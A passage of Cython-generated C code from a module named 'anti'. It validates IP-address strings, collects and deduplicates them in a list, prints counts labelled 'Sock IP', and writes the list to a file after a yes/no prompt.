                                            if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 276, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_28);
                                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                            __pyx_t_17 = PyUnicode_Join(__pyx_kp_u__7, __pyx_t_28); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 276, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_17);
                                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                            __pyx_t_28 = __Pyx_PyNumber_Int(__pyx_t_17); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 276, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_28);
                                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_i); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 277, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_28);
                                            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_28); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 277, __pyx_L121_error)
                                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                            if (__pyx_t_13) {
                                            }
                                            else {
                                                __pyx_t_2 = __pyx_t_13;
                                                goto __pyx_L130_bool_binop_done;
                                            }
                                            __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_temp); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 277, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_17);
                                            __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_split); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 277, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_11);
                                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                            __pyx_t_17 = NULL;
                                            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
                                                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_11);
                                                if (likely(__pyx_t_17)) {
                                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
                                                    __Pyx_INCREF(__pyx_t_17);
                                                    __Pyx_INCREF(function);
                                                    __Pyx_DECREF_SET(__pyx_t_11, function);
                                                }
                                            }
                                            __pyx_t_28 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_17, __pyx_kp_u__55) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_kp_u__55);
                                            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                            if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 277, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_28);
                                            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                                            __pyx_t_31 = PyObject_Length(__pyx_t_28); if (unlikely(__pyx_t_31 == ((Py_ssize_t)-1))) __PYX_ERR(0, 277, __pyx_L121_error)
                                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                            __pyx_t_13 = ((__pyx_t_31 == 4) != 0);
                                            __pyx_t_2 = __pyx_t_13;
                                        __pyx_L130_bool_binop_done:;
                                            if (__pyx_t_2) {
                                                {
                                                    __pyx_t_28 = PyList_New(0); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                        __Pyx_GOTREF(__pyx_t_28);
                                                    __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_temp); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                        __Pyx_GOTREF(__pyx_t_17);
                                                    __pyx_t_23 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_split); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                        __Pyx_GOTREF(__pyx_t_23);
                                                    __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                    __pyx_t_17 = NULL;
                                                    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_23))) {
                                                        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_23);
                                                        if (likely(__pyx_t_17)) {
                                                            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_23);
                                                            __Pyx_INCREF(__pyx_t_17);
                                                            __Pyx_INCREF(function);
                                                            __Pyx_DECREF_SET(__pyx_t_23, function);
                                                        }
                                                    }
                                                    __pyx_t_11 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_23, __pyx_t_17, __pyx_kp_u__55) : __Pyx_PyObject_CallOneArg(__pyx_t_23, __pyx_kp_u__55);
                                                    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                    if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                        __Pyx_GOTREF(__pyx_t_11);
                                                    __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                                                    if (likely(PyList_CheckExact(__pyx_t_11)) || PyTuple_CheckExact(__pyx_t_11)) {
                                                        __pyx_t_23 = __pyx_t_11; __Pyx_INCREF(__pyx_t_23); __pyx_t_31 = 0;
                                                        __pyx_t_32 = NULL;
                                                    }
                                                    else {
                                                        __pyx_t_31 = -1; __pyx_t_23 = PyObject_GetIter(__pyx_t_11); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                            __Pyx_GOTREF(__pyx_t_23);
                                                        __pyx_t_32 = Py_TYPE(__pyx_t_23)->tp_iternext; if (unlikely(!__pyx_t_32)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                    }
                                                    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                                                    for (;;) {
                                                        if (likely(!__pyx_t_32)) {
                                                            if (likely(PyList_CheckExact(__pyx_t_23))) {
                                                                if (__pyx_t_31 >= PyList_GET_SIZE(__pyx_t_23)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                                                __pyx_t_11 = PyList_GET_ITEM(__pyx_t_23, __pyx_t_31); __Pyx_INCREF(__pyx_t_11); __pyx_t_31++; if (unlikely(0 < 0)) __PYX_ERR(0, 278, __pyx_L134_error)
#else
                                                                __pyx_t_11 = PySequence_ITEM(__pyx_t_23, __pyx_t_31); __pyx_t_31++; if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                                    __Pyx_GOTREF(__pyx_t_11);
#endif
                                                            }
                                                            else {
                                                                if (__pyx_t_31 >= PyTuple_GET_SIZE(__pyx_t_23)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                                                __pyx_t_11 = PyTuple_GET_ITEM(__pyx_t_23, __pyx_t_31); __Pyx_INCREF(__pyx_t_11); __pyx_t_31++; if (unlikely(0 < 0)) __PYX_ERR(0, 278, __pyx_L134_error)
#else
                                                                __pyx_t_11 = PySequence_ITEM(__pyx_t_23, __pyx_t_31); __pyx_t_31++; if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                                    __Pyx_GOTREF(__pyx_t_11);
#endif
                                                            }
                                                        }
                                                        else {
                                                            __pyx_t_11 = __pyx_t_32(__pyx_t_23);
                                                            if (unlikely(!__pyx_t_11)) {
                                                                PyObject* exc_type = PyErr_Occurred();
                                                                if (exc_type) {
                                                                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                                                                    else __PYX_ERR(0, 278, __pyx_L134_error)
                                                                }
                                                                break;
                                                            }
                                                            __Pyx_GOTREF(__pyx_t_11);
                                                        }
                                                        __Pyx_XGOTREF(__pyx_8genexpr3__pyx_v_4anti_x);
                                                        __Pyx_DECREF_SET(__pyx_8genexpr3__pyx_v_4anti_x, __pyx_t_11);
                                                        __Pyx_GIVEREF(__pyx_t_11);
                                                        __pyx_t_11 = 0;
                                                        __pyx_t_11 = __Pyx_PyNumber_Int(__pyx_8genexpr3__pyx_v_4anti_x); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                            __Pyx_GOTREF(__pyx_t_11);
                                                        __pyx_t_17 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_11); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 278, __pyx_L134_error)
                                                            __Pyx_GOTREF(__pyx_t_17);
                                                        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                                                        if (unlikely(__Pyx_ListComp_Append(__pyx_t_28, (PyObject*)__pyx_t_17))) __PYX_ERR(0, 278, __pyx_L134_error)
                                                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                    }
                                                    __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                                                    __Pyx_GOTREF(__pyx_8genexpr3__pyx_v_4anti_x);
                                                    __Pyx_DECREF_SET(__pyx_8genexpr3__pyx_v_4anti_x, Py_None);
                                                    goto __pyx_L137_exit_scope;
                                                __pyx_L134_error:;
                                                    __Pyx_GOTREF(__pyx_8genexpr3__pyx_v_4anti_x);
                                                    __Pyx_DECREF_SET(__pyx_8genexpr3__pyx_v_4anti_x, Py_None);
                                                    goto __pyx_L121_error;
                                                __pyx_L137_exit_scope:;
                                                }
                                                __pyx_t_23 = PyUnicode_Join(__pyx_kp_u__55, __pyx_t_28); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 278, __pyx_L121_error)
                                                    __Pyx_GOTREF(__pyx_t_23);
                                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                                __pyx_t_28 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_23); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 278, __pyx_L121_error)
                                                    __Pyx_GOTREF(__pyx_t_28);
                                                __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                                                if (PyDict_SetItem(__pyx_d, __pyx_n_s_temp, __pyx_t_28) < 0) __PYX_ERR(0, 278, __pyx_L121_error)
                                                    __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                                __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_blockk); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 279, __pyx_L121_error)
                                                    __Pyx_GOTREF(__pyx_t_28);
                                                __Pyx_GetModuleGlobalName(__pyx_t_23, __pyx_n_s_temp); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 279, __pyx_L121_error)
                                                    __Pyx_GOTREF(__pyx_t_23);
                                                __pyx_t_33 = __Pyx_PyObject_Append(__pyx_t_28, __pyx_t_23); if (unlikely(__pyx_t_33 == ((int)-1))) __PYX_ERR(0, 279, __pyx_L121_error)
                                                    __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                                __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                                                __Pyx_GetModuleGlobalName(__pyx_t_23, __pyx_n_s_count_ip); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 280, __pyx_L121_error)
                                                    __Pyx_GOTREF(__pyx_t_23);
                                                __pyx_t_28 = __Pyx_PyInt_AddObjC(__pyx_t_23, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 280, __pyx_L121_error)
                                                    __Pyx_GOTREF(__pyx_t_28);
                                                __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                                                if (PyDict_SetItem(__pyx_d, __pyx_n_s_count_ip, __pyx_t_28) < 0) __PYX_ERR(0, 280, __pyx_L121_error)
                                                    __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                            }
                                        }
                                        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                                        __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                                        __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
                                        goto __pyx_L128_try_end;
                                    __pyx_L121_error:;
                                        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                                        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                        __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                                        __Pyx_XDECREF(__pyx_t_23); __pyx_t_23 = 0;
                                        __Pyx_XDECREF(__pyx_t_24); __pyx_t_24 = 0;
                                        __Pyx_XDECREF(__pyx_t_25); __pyx_t_25 = 0;
                                        __Pyx_XDECREF(__pyx_t_26); __pyx_t_26 = 0;
                                        __Pyx_XDECREF(__pyx_t_27); __pyx_t_27 = 0;
                                        __Pyx_XDECREF(__pyx_t_28); __pyx_t_28 = 0;
                                        __Pyx_XDECREF(__pyx_t_29); __pyx_t_29 = 0; {
                                            __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
                                            if (__Pyx_GetException(&__pyx_t_28, &__pyx_t_23, &__pyx_t_17) < 0) __PYX_ERR(0, 281, __pyx_L123_except_error)
                                                __Pyx_GOTREF(__pyx_t_28);
                                            __Pyx_GOTREF(__pyx_t_23);
                                            __Pyx_GOTREF(__pyx_t_17);
                                            goto __pyx_L139_except_continue;
                                        __pyx_L139_except_continue:;
                                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                            __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                            goto __pyx_L127_try_continue;
                                        }
                                    __pyx_L123_except_error:;
                                        __Pyx_XGIVEREF(__pyx_t_7);
                                        __Pyx_XGIVEREF(__pyx_t_19);
                                        __Pyx_XGIVEREF(__pyx_t_18);
                                        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_19, __pyx_t_18);
                                        goto __pyx_L89_except_error;
                                    __pyx_L127_try_continue:;
                                        __Pyx_XGIVEREF(__pyx_t_7);
                                        __Pyx_XGIVEREF(__pyx_t_19);
                                        __Pyx_XGIVEREF(__pyx_t_18);
                                        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_19, __pyx_t_18);
                                        goto __pyx_L119_continue;
                                    __pyx_L128_try_end:;
                                    }
                                __pyx_L119_continue:;
                                }
                                __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                                __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_OK_IP, __pyx_n_s_format); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 283, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_17);
                                __Pyx_GetModuleGlobalName(__pyx_t_23, __pyx_n_s_count_ip); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 283, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_23);
                                __pyx_t_28 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_23); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 283, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_28);
                                __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                                __pyx_t_23 = NULL;
                                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                                    __pyx_t_23 = PyMethod_GET_SELF(__pyx_t_17);
                                    if (likely(__pyx_t_23)) {
                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                                        __Pyx_INCREF(__pyx_t_23);
                                        __Pyx_INCREF(function);
                                        __Pyx_DECREF_SET(__pyx_t_17, function);
                                    }
                                }
                                __pyx_t_21 = (__pyx_t_23) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_23, __pyx_t_28) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_28);
                                __Pyx_XDECREF(__pyx_t_23); __pyx_t_23 = 0;
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 283, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_21);
                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                __pyx_t_17 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_21); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 283, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_17);
                                __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_total_ip); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 284, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_17);
                                __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_count_ip); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 284, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_21);
                                __pyx_t_28 = PyNumber_InPlaceAdd(__pyx_t_17, __pyx_t_21); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 284, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_28);
                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                                if (PyDict_SetItem(__pyx_d, __pyx_n_s_total_ip, __pyx_t_28) < 0) __PYX_ERR(0, 284, __pyx_L89_except_error)
                                    __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                goto __pyx_L118;
                            } {
                                __pyx_t_28 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__64, NULL); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 286, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_28);
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            }
                        __pyx_L118:;
                        }
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        if (__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_temp) < 0) __PYX_ERR(0, 287, __pyx_L89_except_error)
                            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_blockk); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 288, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __pyx_t_28 = PySet_New(__pyx_t_4); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 288, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __pyx_t_4 = PySequence_List(__pyx_t_28); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 288, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        if (PyDict_SetItem(__pyx_d, __pyx_n_s_blockk, __pyx_t_4) < 0) __PYX_ERR(0, 288, __pyx_L89_except_error)
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Total_IP_Sock_IP, __pyx_n_s_format); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 289, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_total_ip); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 289, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __pyx_t_21 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_28); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 289, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_21);
                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        __pyx_t_28 = __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_21); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 289, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                        __pyx_t_21 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_28); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 289, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_21);
                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                        __pyx_t_21 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Real_IP_Sock_IP, __pyx_n_s_format); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 290, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_21);
                        __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_blockk); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 290, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __pyx_t_14 = PyObject_Length(__pyx_t_28); if (unlikely(__pyx_t_14 == ((Py_ssize_t)-1))) __PYX_ERR(0, 290, __pyx_L89_except_error)
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        __pyx_t_28 = PyInt_FromSsize_t(__pyx_t_14); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 290, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_28); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 290, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        __pyx_t_28 = __Pyx_PyObject_CallOneArg(__pyx_t_21, __pyx_t_4); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 290, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_28); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 290, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__65, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 291, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __pyx_t_28 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_4); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 291, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        if (PyDict_SetItem(__pyx_d, __pyx_n_s_khanh, __pyx_t_28) < 0) __PYX_ERR(0, 291, __pyx_L89_except_error)
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        while (1) {
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_khanh); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 293, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_28, __pyx_n_u_Y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 293, __pyx_L89_except_error)
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            if (!__pyx_t_13) {
                            }
                            else {
                                __pyx_t_2 = __pyx_t_13;
                                goto __pyx_L143_bool_binop_done;
                            }
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_khanh); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 293, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_28, __pyx_n_u_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 293, __pyx_L89_except_error)
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_2 = __pyx_t_13;
                        __pyx_L143_bool_binop_done:;
                            if (__pyx_t_2) { {
                                    __pyx_t_28 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__66, NULL); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 294, __pyx_L89_except_error)
                                        __Pyx_GOTREF(__pyx_t_28);
                                    __pyx_t_18 = __Pyx_PyObject_LookupSpecial(__pyx_t_28, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 294, __pyx_L89_except_error)
                                        __Pyx_GOTREF(__pyx_t_18);
                                    __pyx_t_21 = __Pyx_PyObject_LookupSpecial(__pyx_t_28, __pyx_n_s_enter); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 294, __pyx_L145_error)
                                        __Pyx_GOTREF(__pyx_t_21);
                                    __pyx_t_17 = NULL;
                                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_21))) {
                                        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_21);
                                        if (likely(__pyx_t_17)) {
                                            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_21);
                                            __Pyx_INCREF(__pyx_t_17);
                                            __Pyx_INCREF(function);
                                            __Pyx_DECREF_SET(__pyx_t_21, function);
                                        }
                                    }
                                    __pyx_t_4 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_21, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_21);
                                    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 294, __pyx_L145_error)
                                        __Pyx_GOTREF(__pyx_t_4);
                                    __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                                    __pyx_t_21 = __pyx_t_4;
                                    __pyx_t_4 = 0;
                                    __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0; {
                                        {
                                            __Pyx_PyThreadState_declare
                                                __Pyx_PyThreadState_assign
                                                __Pyx_ExceptionSave(&__pyx_t_19, &__pyx_t_7, &__pyx_t_16);
                                            __Pyx_XGOTREF(__pyx_t_19);
                                            __Pyx_XGOTREF(__pyx_t_7);
                                            __Pyx_XGOTREF(__pyx_t_16); {
                                                if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_21) < 0) __PYX_ERR(0, 294, __pyx_L151_error)
                                                    __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                                                __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_f); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 295, __pyx_L151_error)
                                                    __Pyx_GOTREF(__pyx_t_28);
                                                __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_28, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 295, __pyx_L151_error)
                                                    __Pyx_GOTREF(__pyx_t_4);
                                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                                __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_blockk_2, __pyx_n_s_format); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 295, __pyx_L151_error)
                                                    __Pyx_GOTREF(__pyx_t_17);
                                                __Pyx_GetModuleGlobalName(__pyx_t_23, __pyx_n_s_blockk); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 295, __pyx_L151_error)
                                                    __Pyx_GOTREF(__pyx_t_23);
                                                __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_23); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 295, __pyx_L151_error)
                                                    __Pyx_GOTREF(__pyx_t_11);
                                                __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                                                __pyx_t_23 = NULL;
                                                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                                                    __pyx_t_23 = PyMethod_GET_SELF(__pyx_t_17);
                                                    if (likely(__pyx_t_23)) {
                                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                                                        __Pyx_INCREF(__pyx_t_23);
                                                        __Pyx_INCREF(function);
                                                        __Pyx_DECREF_SET(__pyx_t_17, function);
                                                    }
                                                }
                                                __pyx_t_28 = (__pyx_t_23) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_23, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_11);
                                                __Pyx_XDECREF(__pyx_t_23); __pyx_t_23 = 0;
                                                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                                                if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 295, __pyx_L151_error)
                                                    __Pyx_GOTREF(__pyx_t_28);
